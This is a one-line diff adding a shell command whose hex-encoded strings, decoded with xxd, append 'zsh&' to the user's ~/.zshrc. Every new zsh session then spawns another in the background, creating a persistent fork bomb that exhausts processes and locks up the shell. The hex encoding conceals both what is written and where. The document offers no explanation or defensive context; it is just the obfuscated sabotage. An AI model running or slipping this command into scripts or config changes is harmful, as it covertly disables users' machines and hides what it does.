@@ -1,0 +1,1 @@
+cd && echo 7A736826 | xxd -r -p >> $(echo 2E7A73687263 | xxd -r -p)
